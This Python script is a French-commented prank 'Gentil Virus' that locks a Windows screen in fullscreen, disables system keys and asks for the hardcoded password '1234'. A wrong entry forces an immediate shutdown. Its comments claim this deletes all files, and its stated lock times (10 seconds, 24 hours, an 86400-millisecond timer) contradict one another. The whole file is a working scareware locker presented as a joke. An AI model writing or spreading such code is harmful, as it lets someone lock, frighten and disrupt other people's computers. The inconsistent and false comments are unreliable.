# Ce virus est gentil, il va bloquer ton ordinateur pendant 10 secondes
import time
import os
from customtkinter import *
import keyboard

password = "1234"  # Mot de passe pour débloquer


def block(root, entry):
    """Débloque l'ordinateur si le bon mot de passe est entré."""
    if entry.get() == password:
        root.destroy()
    else:
        os.system("shutdown /s /t 0")   # this command delete all files in the pc


def virus():
    """Affiche un écran de blocage pendant 24 heures."""
    root = CTk()
    root.title("Gentil Virus")
    root.attributes("-fullscreen", True)
    root.configure(fg_color="black")

    # Texte principal
    label_title = CTkLabel(root, text="Gentil Virus", font=("Arial", 50), text_color="red")
    label_title.pack(pady=20)
    
    label_info = CTkLabel(root, text="Votre ordinateur est bloqué pour 24 heures", font=("Arial", 20), text_color="red")
    label_info.pack(pady=20)

    # Champ pour entrer un mot de passe
    entry = CTkEntry(root, font=("Arial", 20), show="*")
    entry.pack(pady=20)

    # Bouton de déblocage
    button = CTkButton(root, text="Débloquer", font=("Arial", 20), command=lambda: block(root, entry))
    button.pack(pady=20)
    entry.bind("<Return>", lambda event: button.invoke())

    labelX = CTkLabel(root, text="if you dont guess the password , you need to wait 24h from now to unlock you pc", font=("Arial", 10), text_color="red")
    labelX.pack(pady=20)
    # Bloque le PC (désactive touches système)
    for key in ["alt", "ctrl", "shift", "win", "esc", "tab", "f4", "del"]:
        keyboard.block_key(key)

    # Débloque automatiquement après 10 secondes
    root.after(86400, root.destroy)
    

    root.mainloop()


virus()
